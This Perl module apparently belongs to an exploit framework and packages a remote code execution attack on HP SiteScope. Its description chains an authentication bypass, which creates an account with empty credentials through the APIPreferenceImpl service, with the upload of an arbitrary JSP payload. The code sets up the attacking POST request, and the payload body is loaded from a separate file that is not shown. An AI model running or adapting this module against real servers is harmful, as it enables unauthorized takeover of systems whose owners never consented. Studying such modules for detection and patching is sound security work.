package HP::MSF::HpSitescopeUploadfileshandler;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "HpSitescopeUploadfileshandler";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a code execution flaw in HP SiteScope. It exploits two

        vulnerabilities in order to get its objective. An authentication bypass in the

        create operation, available through the APIPreferenceImpl AXIS service, to create

        a new account with empty credentials and, subsequently, uses the new account to

        abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP.

        The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2

        and Linux CentOS 6.3.

      ",
  METHOD => "POST",
  MSF_MODULE => "hp_sitescope_uploadfileshandler",
  OSVDB => 85151,
  PATHS => ["SiteScope/"],
  TITLE => "HP SiteScope Remote Code Execution",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'services/APIPreferenceImpl',
      PAYLOAD      => read_file('MSFExploits/HP/MSF/src/HpSitescopeUploadfileshandler.payload', 1),
      TEXT   => 'Sending Exploit #2 Request : [POST] /services/APIPreferenceImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
